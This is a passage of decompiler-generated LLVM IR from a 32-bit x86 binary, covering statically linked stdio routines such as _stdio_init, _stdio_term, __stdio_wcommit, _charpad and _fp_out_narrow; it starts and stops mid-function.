dec_label_pc_804e49d:                             ; preds = %dec_label_pc_804e486
  %v1_804e49d = add i32 %v1_804e48e, 4096
  store i32 %v1_804e49d, i32* %eax.global-to-local, align 4
  %v1_804e4a2 = load i32, i32* @ebp, align 4
  %v2_804e4a2 = add i32 %v1_804e4a2, 12
  %v3_804e4a2 = inttoptr i32 %v2_804e4a2 to i32*
  store i32 %v1_804e49d, i32* %v3_804e4a2, align 4
  %v0_804e4a5 = load i32, i32* @ebp, align 4
  %v1_804e4a5 = inttoptr i32 %v0_804e4a5 to i32*
  %v2_804e4a5 = load i32, i32* %v1_804e4a5, align 4
  %v1_804e4a8 = udiv i32 %v2_804e4a5, 256
  %v3_804e4a8 = and i32 %v1_804e4a8, 191
  %v8_804e4a8 = or i32 %v3_804e4a8, 64
  %v10_804e4a8 = mul nuw nsw i32 %v8_804e4a8, 256
  %v11_804e4a8 = and i32 %v2_804e4a5, -65281
  %v12_804e4a8 = or i32 %v10_804e4a8, %v11_804e4a8
  store i32 %v12_804e4a8, i32* %eax.global-to-local, align 4
  %v1_804e4ab = trunc i32 %v12_804e4a8 to i16
  %v3_804e4ab = inttoptr i32 %v0_804e4a5 to i16*
  store i16 %v1_804e4ab, i16* %v3_804e4ab, align 2
  br label %dec_label_pc_804e4b8

dec_label_pc_804e4b1:                             ; preds = %dec_label_pc_804e486
  %v0_804e4b1 = load i32, i32* @ebp, align 4
  %v1_804e4b1 = add i32 %v0_804e4b1, 12
  %v2_804e4b1 = inttoptr i32 %v1_804e4b1 to i32*
  store i32 0, i32* %v2_804e4b1, align 4
  br label %dec_label_pc_804e4b8

dec_label_pc_804e4b8:                             ; preds = %dec_label_pc_804e431, %dec_label_pc_804e49d, %dec_label_pc_804e4b1
  %v0_804e4b8 = load i32, i32* @ebp, align 4
  %v1_804e4b8 = add i32 %v0_804e4b8, 8
  %v2_804e4b8 = inttoptr i32 %v1_804e4b8 to i32*
  %v3_804e4b8 = load i32, i32* %v2_804e4b8, align 4
  store i32 %v3_804e4b8, i32* %eax.global-to-local, align 4
  %v1_804e4bb = add i32 %v0_804e4b8, 2
  %v2_804e4bb = inttoptr i32 %v1_804e4bb to i8*
  store i8 0, i8* %v2_804e4bb, align 1
  %v0_804e4bf = load i32, i32* @ebp, align 4
  %v1_804e4bf = add i32 %v0_804e4bf, 44
  %v2_804e4bf = inttoptr i32 %v1_804e4bf to i32*
  store i32 0, i32* %v2_804e4bf, align 4
  %v0_804e4c6 = load i32, i32* @ebp, align 4
  %v1_804e4c6 = add i32 %v0_804e4c6, 1
  %v2_804e4c6 = inttoptr i32 %v1_804e4c6 to i8*
  %v3_804e4c6 = load i8, i8* %v2_804e4c6, align 1
  %v4_804e4c6 = and i8 %v3_804e4c6, 32
  %v5_804e4c6 = icmp eq i8 %v4_804e4c6, 0
  %v0_804e4ca = load i32, i32* %eax.global-to-local, align 4
  %v2_804e4ca = add i32 %v0_804e4c6, 24
  %v3_804e4ca = inttoptr i32 %v2_804e4ca to i32*
  store i32 %v0_804e4ca, i32* %v3_804e4ca, align 4
  %v0_804e4cd = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4cd = load i32, i32* @ebp, align 4
  %v2_804e4cd = add i32 %v1_804e4cd, 28
  %v3_804e4cd = inttoptr i32 %v2_804e4cd to i32*
  store i32 %v0_804e4cd, i32* %v3_804e4cd, align 4
  %v0_804e4d0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4d0 = load i32, i32* @ebp, align 4
  %v2_804e4d0 = add i32 %v1_804e4d0, 16
  %v3_804e4d0 = inttoptr i32 %v2_804e4d0 to i32*
  store i32 %v0_804e4d0, i32* %v3_804e4d0, align 4
  %v0_804e4d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4d3 = load i32, i32* @ebp, align 4
  %v2_804e4d3 = add i32 %v1_804e4d3, 20
  %v3_804e4d3 = inttoptr i32 %v2_804e4d3 to i32*
  store i32 %v0_804e4d3, i32* %v3_804e4d3, align 4
  %v0_804e4d6 = load i32, i32* @global_var_805a48c.161, align 4
  store i32 %v0_804e4d6, i32* @eax, align 4
  %v1_804e4db = load i32, i32* @ebp, align 4
  %v2_804e4db = add i32 %v1_804e4db, 52
  %v3_804e4db = inttoptr i32 %v2_804e4db to i32*
  store i32 %v0_804e4d6, i32* %v3_804e4db, align 4
  br i1 %v5_804e4c6, label %dec_label_pc_804e54d, label %dec_label_pc_804e4e0

dec_label_pc_804e4e0:                             ; preds = %dec_label_pc_804e4b8
  %v2_804e4eb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e4eb, i32* %stack_var_-76, align 4
  %v2_804e4f0 = call i32 @__pthread_return_void(i32 %v2_804e4eb, i32 134552291)
  store i32 %v2_804e4f0, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a474.158 to i32), i32* %stack_var_-76, align 4
  %v1_804e4fc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a474.158 to i32))
  store i32 %v1_804e4fc, i32* @eax, align 4
  %v2_804e50e = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e50e, i32* %stack_var_-76, align 4
  %v2_804e513 = call i32 @__pthread_return_void(i32 %v2_804e50e, i32 134552291)
  store i32 %v2_804e513, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a45c.162 to i32), i32* %stack_var_-76, align 4
  %v1_804e51f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a45c.162 to i32))
  %v0_804e524 = load i32, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 8
  store i32 %v0_804e524, i32* @eax, align 4
  %v1_804e529 = load i32, i32* @ebp, align 4
  %v2_804e529 = add i32 %v1_804e529, 32
  %v3_804e529 = inttoptr i32 %v2_804e529 to i32*
  store i32 %v0_804e524, i32* %v3_804e529, align 4
  %v2_804e52c = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804e52c, i32* @ecx, align 4
  %v0_804e52d = load i32, i32* @ebp, align 4
  store i32 %v0_804e52d, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 8
  store i32 %v2_804e50e, i32* %stack_var_-76, align 4
  %v2_804e537 = call i32 @__pthread_return_void(i32 %v2_804e50e, i32 1)
  store i32 %v2_804e50e, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e4eb, i32* %stack_var_-76, align 4
  %v2_804e541 = call i32 @__pthread_return_void(i32 %v2_804e4eb, i32 1)
  br label %dec_label_pc_804e546

dec_label_pc_804e546:                             ; preds = %dec_label_pc_804e35f, %dec_label_pc_804e4e0
  %storemerge = phi i32 [ %v2_804e541, %dec_label_pc_804e4e0 ], [ %v1_804e365, %dec_label_pc_804e35f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e54d

dec_label_pc_804e54b:                             ; preds = %dec_label_pc_804e355, %dec_label_pc_804e342
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e54d

dec_label_pc_804e54d:                             ; preds = %dec_label_pc_804e4b8, %dec_label_pc_804e38e, %dec_label_pc_804e546, %dec_label_pc_804e54b
  %v0_804e550 = load i32, i32* @ebp, align 4
  store i32 %v0_804e550, i32* %eax.global-to-local, align 4
  %v2_804e552 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e552, i32* @ebx, align 4
  store i32 %v0_804e316, i32* @esi, align 4
  store i32 %v0_804e315, i32* @edi, align 4
  store i32 %v0_804e314, i32* @ebp, align 4
  ret i32 %v0_804e550

; uselistorder directives
  uselistorder i32 %v2_804e50e, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804e4eb, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e4a5, { 1, 0 }
  uselistorder i32 %v1_804e48e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e475, { 1, 0 }
  uselistorder i32 %v1_804e45a, { 1, 0, 2 }
  uselistorder i32 %v11_804e40f, { 1, 0 }
  uselistorder i32 %v1_804e3e1, { 1, 0 }
  uselistorder i32 %v0_804e3dd, { 1, 0 }
  uselistorder i32 %v2_804e413, { 1, 0, 2 }
  uselistorder i32 %v1_804e393, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 27 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_804e54d, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e546, { 1, 0 }
  uselistorder label %dec_label_pc_804e4b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e403, { 1, 0 }
  uselistorder label %dec_label_pc_804e3c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e38a, { 1, 0 }
  uselistorder label %dec_label_pc_804e371, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e559 = load i32, i32* @edi, align 4
  %v0_804e55a = load i32, i32* @esi, align 4
  %v0_804e55b = load i32, i32* @ebx, align 4
  store i32 %v0_804e55b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e564 = call i32 @__errno_location(i32 %v0_804e55b)
  %v0_804e56c = load i16, i16* @global_var_805a4a0.154, align 32
  %v1_804e56c = zext i16 %v0_804e56c to i32
  store i32 %v1_804e56c, i32* @esi, align 4
  %v1_804e573 = inttoptr i32 %v1_804e564 to i32*
  %v2_804e573 = load i32, i32* %v1_804e573, align 4
  store i32 %v2_804e573, i32* %ebp.global-to-local, align 4
  store i32 %v1_804e564, i32* @edi, align 4
  %v1_804e579 = call i32 @isatty(i32 0)
  %v0_804e57e = load i32, i32* @ebx, align 4
  %v2_804e587 = sub i32 %v0_804e57e, %v1_804e579
  %v2_804e58b = mul i32 %v2_804e587, 256
  %v0_804e58e = load i32, i32* @esi, align 4
  %v2_804e58e = xor i32 %v0_804e58e, %v2_804e58b
  %v1_804e590 = trunc i32 %v2_804e58e to i16
  store i16 %v1_804e590, i16* @global_var_805a4a0.154, align 32
  %v0_804e597 = load i16, i16* @global_var_805a4f0.155, align 16
  %v1_804e597 = zext i16 %v0_804e597 to i32
  store i32 %v1_804e597, i32* @esi, align 4
  %v1_804e59e = call i32 @isatty(i32 1)
  %v0_804e5a3 = load i32, i32* @ebx, align 4
  %v2_804e5a3 = sub i32 %v0_804e5a3, %v1_804e59e
  %v2_804e5a5 = mul i32 %v2_804e5a3, 256
  %v0_804e5a8 = load i32, i32* @esi, align 4
  %v2_804e5a8 = xor i32 %v2_804e5a5, %v0_804e5a8
  %v1_804e5aa = trunc i32 %v2_804e5a8 to i16
  store i16 %v1_804e5aa, i16* @global_var_805a4f0.155, align 16
  %v0_804e5b1 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e5b1 = load i32, i32* @edi, align 4
  %v2_804e5b1 = inttoptr i32 %v1_804e5b1 to i32*
  store i32 %v0_804e5b1, i32* %v2_804e5b1, align 4
  %v2_804e5b6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e5b6, i32* @ebx, align 4
  store i32 %v0_804e55a, i32* @esi, align 4
  store i32 %v0_804e559, i32* @edi, align 4
  ret i32 %v1_804e59e

; uselistorder directives
  uselistorder i32 %v1_804e564, { 1, 0 }
  uselistorder i16* @global_var_805a4f0.155, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e5c9 = inttoptr i32 %arg1 to i16*
  %v4_804e5c9 = call i32 @memcpy(i16* %v3_804e5c9, i32 ptrtoint (i32* @global_var_8057320.164 to i32), i32 24)
  ret i32 %v4_804e5c9
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e5d2 = load i32, i32* @esi, align 4
  %v0_804e5d3 = load i32, i32* @ebx, align 4
  store i32 %v0_804e5d3, i32* %stack_var_-8, align 4
  %v1_804e5dc = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805a45c.162 to i32))
  store i32 %v1_804e5dc, i32* %eax.global-to-local, align 4
  %v1_804e5e8 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805a474.158 to i32))
  store i32 %v1_804e5e8, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e63222 = icmp eq i32 %storemerge21, 0
  %v1_804e63424 = icmp eq i1 %v1_804e63222, false
  br i1 %v1_804e63424, label %dec_label_pc_804e5f5.lr.ph, label %dec_label_pc_804e652.preheader

dec_label_pc_804e5f5.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e5f5

dec_label_pc_804e5f5:                             ; preds = %dec_label_pc_804e5f5.lr.ph, %dec_label_pc_804e61c
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804e5f5.lr.ph ], [ %storemerge, %dec_label_pc_804e61c ]
  %v1_804e5f8 = add i32 %storemerge25, 56
  store i32 %v1_804e5f8, i32* @esi, align 4
  %v1_804e5fc = call i32 @__pthread_return_0(i32 %v1_804e5f8)
  store i32 %v1_804e5fc, i32* %eax.global-to-local, align 4
  %v1_804e604 = icmp eq i32 %v1_804e5fc, 0
  br i1 %v1_804e604, label %dec_label_pc_804e61c, label %dec_label_pc_804e608

dec_label_pc_804e608:                             ; preds = %dec_label_pc_804e5f5
  %v0_804e608 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e608 = add i32 %v0_804e608, 8
  %v2_804e608 = inttoptr i32 %v1_804e608 to i32*
  %v3_804e608 = load i32, i32* %v2_804e608, align 4
  store i32 %v3_804e608, i32* %eax.global-to-local, align 4
  %v1_804e60b = inttoptr i32 %v0_804e608 to i16*
  store i16 48, i16* %v1_804e60b, align 2
  %v0_804e610 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e610 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e610 = add i32 %v1_804e610, 24
  %v3_804e610 = inttoptr i32 %v2_804e610 to i32*
  store i32 %v0_804e610, i32* %v3_804e610, align 4
  %v0_804e613 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e613 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e613 = add i32 %v1_804e613, 28
  %v3_804e613 = inttoptr i32 %v2_804e613 to i32*
  store i32 %v0_804e613, i32* %v3_804e613, align 4
  %v0_804e616 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e616 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e616 = add i32 %v1_804e616, 16
  %v3_804e616 = inttoptr i32 %v2_804e616 to i32*
  store i32 %v0_804e616, i32* %v3_804e616, align 4
  %v0_804e619 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e619 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e619 = add i32 %v1_804e619, 20
  %v3_804e619 = inttoptr i32 %v2_804e619 to i32*
  store i32 %v0_804e619, i32* %v3_804e619, align 4
  br label %dec_label_pc_804e61c

dec_label_pc_804e61c:                             ; preds = %dec_label_pc_804e5f5, %dec_label_pc_804e608
  %v0_804e61f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e61f = add i32 %v0_804e61f, 52
  %v2_804e61f = inttoptr i32 %v1_804e61f to i32*
  store i32 1, i32* %v2_804e61f, align 4
  %v0_804e626 = load i32, i32* @esi, align 4
  %v1_804e627 = call i32 @__stdio_init_mutex(i32 %v0_804e626)
  store i32 %v1_804e627, i32* %eax.global-to-local, align 4
  %v0_804e62c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e62c = add i32 %v0_804e62c, 32
  %v2_804e62c = inttoptr i32 %v1_804e62c to i32*
  %storemerge = load i32, i32* %v2_804e62c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e632 = icmp eq i32 %storemerge, 0
  %v1_804e634 = icmp eq i1 %v1_804e632, false
  br i1 %v1_804e634, label %dec_label_pc_804e5f5, label %dec_label_pc_804e62f.dec_label_pc_804e652.preheader_crit_edge

dec_label_pc_804e62f.dec_label_pc_804e652.preheader_crit_edge: ; preds = %dec_label_pc_804e61c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 4
  br label %dec_label_pc_804e652.preheader

dec_label_pc_804e652.preheader:                   ; preds = %dec_label_pc_804e62f.dec_label_pc_804e652.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e62f.dec_label_pc_804e652.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e6523 = icmp eq i32 %storemerge12, 0
  %v1_804e65410 = icmp eq i1 %v1_804e6523, false
  br i1 %v1_804e65410, label %dec_label_pc_804e63e.preheader, label %dec_label_pc_804e656

dec_label_pc_804e63e.preheader:                   ; preds = %dec_label_pc_804e652.preheader
  br label %dec_label_pc_804e63e

dec_label_pc_804e63e:                             ; preds = %dec_label_pc_804e63e.preheader, %dec_label_pc_804e64f
  %v0_804e646 = phi i32 [ %storemerge1, %dec_label_pc_804e64f ], [ %storemerge12, %dec_label_pc_804e63e.preheader ]
  %v1_804e63e = inttoptr i32 %v0_804e646 to i8*
  %v2_804e63e = load i8, i8* %v1_804e63e, align 1
  %v3_804e63e = and i8 %v2_804e63e, 64
  %v4_804e63e = icmp eq i8 %v3_804e63e, 0
  br i1 %v4_804e63e, label %dec_label_pc_804e64f, label %dec_label_pc_804e643

dec_label_pc_804e643:                             ; preds = %dec_label_pc_804e63e
  %v1_804e647 = call i32 @__stdio_wcommit(i32 %v0_804e646)
  store i32 %v1_804e647, i32* %eax.global-to-local, align 4
  %v0_804e64f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e64f

dec_label_pc_804e64f:                             ; preds = %dec_label_pc_804e63e, %dec_label_pc_804e643
  %v0_804e64f = phi i32 [ %v0_804e646, %dec_label_pc_804e63e ], [ %v0_804e64f.pre, %dec_label_pc_804e643 ]
  %v1_804e64f = add i32 %v0_804e64f, 32
  %v2_804e64f = inttoptr i32 %v1_804e64f to i32*
  %storemerge1 = load i32, i32* %v2_804e64f, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e652 = icmp eq i32 %storemerge1, 0
  %v1_804e654 = icmp eq i1 %v1_804e652, false
  br i1 %v1_804e654, label %dec_label_pc_804e63e, label %dec_label_pc_804e656

dec_label_pc_804e656:                             ; preds = %dec_label_pc_804e64f, %dec_label_pc_804e652.preheader
  %v2_804e656 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e656, i32* %eax.global-to-local, align 4
  %v2_804e657 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e657, i32* @ebx, align 4
  store i32 %v0_804e5d2, i32* @esi, align 4
  ret i32 %v2_804e656

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804e64f, { 1, 0 }
  uselistorder label %dec_label_pc_804e63e, { 1, 0 }
  uselistorder label %dec_label_pc_804e61c, { 1, 0 }
  uselistorder label %dec_label_pc_804e5f5, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e65c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e664 = add i32 %arg1, 8
  %v2_804e664 = inttoptr i32 %v1_804e664 to i32*
  %v3_804e664 = load i32, i32* %v2_804e664, align 4
  store i32 %v3_804e664, i32* %edx.global-to-local, align 4
  %v1_804e667 = add i32 %arg1, 16
  %v2_804e667 = inttoptr i32 %v1_804e667 to i32*
  %v3_804e667 = load i32, i32* %v2_804e667, align 4
  %v2_804e66a = sub i32 %v3_804e667, %v3_804e664
  %v12_804e66a = icmp eq i32 %v2_804e66a, 0
  store i32 %v2_804e66a, i32* %eax.global-to-local, align 4
  br i1 %v12_804e66a, label %dec_label_pc_804e67d, label %dec_label_pc_804e66e

dec_label_pc_804e66e:                             ; preds = %entry
  store i32 %v3_804e664, i32* %v2_804e667, align 4
  %v0_804e671 = load i32, i32* @ecx, align 4
  %v0_804e672 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e673 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e674 = load i32, i32* @ebx, align 4
  %v4_804e675 = inttoptr i32 %v0_804e674 to i16*
  %v5_804e675 = call i32 @__stdio_WRITE(i16* %v4_804e675, i32 %v0_804e673, i32 %v0_804e672, i32 %v0_804e671)
  store i32 %v5_804e675, i32* %eax.global-to-local, align 4
  %v0_804e67d.pre = load i32, i32* @ebx, align 4
  %v2_804e683.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e67d

dec_label_pc_804e67d:                             ; preds = %entry, %dec_label_pc_804e66e
  %v2_804e683 = phi i32 [ %tmp11, %entry ], [ %v2_804e683.pre, %dec_label_pc_804e66e ]
  %v0_804e67d = phi i32 [ %arg1, %entry ], [ %v0_804e67d.pre, %dec_label_pc_804e66e ]
  %v1_804e67d = add i32 %v0_804e67d, 16
  %v2_804e67d = inttoptr i32 %v1_804e67d to i32*
  %v3_804e67d = load i32, i32* %v2_804e67d, align 4
  store i32 %v3_804e67d, i32* %eax.global-to-local, align 4
  %v2_804e680 = add i32 %v0_804e67d, 8
  %v3_804e680 = inttoptr i32 %v2_804e680 to i32*
  %v4_804e680 = load i32, i32* %v3_804e680, align 4
  %v5_804e680 = sub i32 %v3_804e67d, %v4_804e680
  store i32 %v5_804e680, i32* %eax.global-to-local, align 4
  store i32 %v2_804e683, i32* @edx, align 4
  store i32 %v0_804e65c, i32* @ebx, align 4
  ret i32 %v5_804e680

; uselistorder directives
  uselistorder i32 %v0_804e67d, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e67d, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e688 = load i32, i32* @edi, align 4
  %v0_804e689 = load i32, i32* @eax, align 4
  store i32 %v0_804e689, i32* @edi, align 4
  %v0_804e68b = load i32, i32* @esi, align 4
  %v0_804e68c = load i32, i32* @ecx, align 4
  store i32 %v0_804e68c, i32* @esi, align 4
  %v0_804e68e = load i32, i32* @ebx, align 4
  store i32 %v0_804e68c, i32* @ebx, align 4
  %v0_804e694 = load i32, i32* @edx, align 4
  store i32 %v0_804e694, i32* %stack_var_-13, align 4
  %v1_804e69b2 = icmp eq i32 %v0_804e68c, 0
  br i1 %v1_804e69b2, label %dec_label_pc_804e6b3, label %dec_label_pc_804e69f.lr.ph

dec_label_pc_804e69f.lr.ph:                       ; preds = %entry
  %v2_804e69f = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e69f

dec_label_pc_804e69a:                             ; preds = %dec_label_pc_804e69f
  %v1_804e69a = add i32 %v0_804e69a, -1
  %v8_804e69a = icmp eq i32 %v1_804e69a, 0
  store i32 %v1_804e69a, i32* @ebx, align 4
  br i1 %v8_804e69a, label %dec_label_pc_804e6b3.loopexit, label %dec_label_pc_804e69a.dec_label_pc_804e69f_crit_edge

dec_label_pc_804e69a.dec_label_pc_804e69f_crit_edge: ; preds = %dec_label_pc_804e69a
  %v0_804e6a3.pre = load i32, i32* @edx, align 4
  %v0_804e6a4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e69f

dec_label_pc_804e69f:                             ; preds = %dec_label_pc_804e69a.dec_label_pc_804e69f_crit_edge, %dec_label_pc_804e69f.lr.ph
  %v0_804e6a4 = phi i32 [ %v0_804e6a4.pre, %dec_label_pc_804e69a.dec_label_pc_804e69f_crit_edge ], [ %v0_804e689, %dec_label_pc_804e69f.lr.ph ]
  %v0_804e6a3 = phi i32 [ %v0_804e6a3.pre, %dec_label_pc_804e69a.dec_label_pc_804e69f_crit_edge ], [ %v0_804e694, %dec_label_pc_804e69f.lr.ph ]
  %v4_804e6a8 = call i32 @__stdio_fwrite(i32 %v2_804e69f, i32 1, i32 %v0_804e6a4, i32 %v0_804e6a3)
  %v8_804e6b0 = icmp eq i32 %v4_804e6a8, 1
  %v0_804e69a = load i32, i32* @ebx, align 4
  br i1 %v8_804e6b0, label %dec_label_pc_804e69a, label %dec_label_pc_804e6b3.loopexit

dec_label_pc_804e6b3.loopexit:                    ; preds = %dec_label_pc_804e69a, %dec_label_pc_804e69f
  %v1_804e6b6.ph = phi i32 [ %v0_804e69a, %dec_label_pc_804e69f ], [ 0, %dec_label_pc_804e69a ]
  %v0_804e6b6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e6b3

dec_label_pc_804e6b3:                             ; preds = %dec_label_pc_804e6b3.loopexit, %entry
  %v0_804e6b6 = phi i32 [ 0, %entry ], [ %v0_804e6b6.pre, %dec_label_pc_804e6b3.loopexit ]
  %v1_804e6b6 = phi i32 [ 0, %entry ], [ %v1_804e6b6.ph, %dec_label_pc_804e6b3.loopexit ]
  %v2_804e6b6 = sub i32 %v0_804e6b6, %v1_804e6b6
  store i32 %v0_804e68e, i32* @ebx, align 4
  store i32 %v0_804e68b, i32* @esi, align 4
  store i32 %v0_804e688, i32* @edi, align 4
  ret i32 %v2_804e6b6

; uselistorder directives
  uselistorder i32 %v1_804e69a, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e6b3.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e6d1 = trunc i32 %arg2 to i8
  %v5_804e6d1 = icmp slt i8 %v3_804e6d1, 0
  %v1_804e6d3 = icmp eq i1 %v5_804e6d1, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e6d3, label %dec_label_pc_804e704, label %dec_label_pc_804e6d5

dec_label_pc_804e6d5:                             ; preds = %entry
  %v3_804e6dc = call i32 @strlen(i8* %arg4)
  %v0_804e6e4 = load i32, i32* @ebx, align 4
  %v2_804e6e4 = sub i32 %v0_804e6e4, %v3_804e6dc
  store i32 %v2_804e6e4, i32* @ebx, align 4
  store i32 %v3_804e6dc, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e6e4, 1
  br i1 %tmp23, label %dec_label_pc_804e702, label %dec_label_pc_804e6ec

dec_label_pc_804e6ec:                             ; preds = %dec_label_pc_804e6d5
  store i32 %arg1, i32* @eax, align 4
  %v0_804e6f0 = load i32, i32* @edi, align 4
  %v1_804e6f0 = urem i32 %v0_804e6f0, 128
  store i32 %v1_804e6f0, i32* @edi, align 4
  store i32 %v2_804e6e4, i32* @ecx, align 4
  store i32 %v1_804e6f0, i32* @edx, align 4
  %v0_804e6f7 = call i32 @_charpad()
  %v12_804e6fc = icmp eq i32 %v0_804e6f7, %v2_804e6e4
  store i32 %v0_804e6f7, i32* @ebp, align 4
  %v1_804e700 = icmp eq i1 %v12_804e6fc, false
  br i1 %v1_804e700, label %dec_label_pc_804e71e, label %dec_label_pc_804e6ec.dec_label_pc_804e702_crit_edge

dec_label_pc_804e6ec.dec_label_pc_804e702_crit_edge: ; preds = %dec_label_pc_804e6ec
  %v0_804e702.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e702

dec_label_pc_804e702:                             ; preds = %dec_label_pc_804e6ec.dec_label_pc_804e702_crit_edge, %dec_label_pc_804e6d5
  %v0_804e702 = phi i32 [ %v0_804e702.pre, %dec_label_pc_804e6ec.dec_label_pc_804e702_crit_edge ], [ %v3_804e6dc, %dec_label_pc_804e6d5 ]
  store i32 %v0_804e702, i32* @ebx, align 4
  br label %dec_label_pc_804e704

dec_label_pc_804e704:                             ; preds = %entry, %dec_label_pc_804e702
  %v0_804e70f = phi i32 [ %arg3, %entry ], [ %v0_804e702, %dec_label_pc_804e702 ]
  %tmp24 = icmp slt i32 %v0_804e70f, 1
  br i1 %tmp24, label %dec_label_pc_804e71c, label %dec_label_pc_804e70a

dec_label_pc_804e70a:                             ; preds = %dec_label_pc_804e704
  %v0_804e70a = load i32, i32* @ecx, align 4
  %v5_804e714 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e70f, i32 %arg1, i32 %v0_804e70a)
  br label %dec_label_pc_804e71c

dec_label_pc_804e71c:                             ; preds = %dec_label_pc_804e704, %dec_label_pc_804e70a
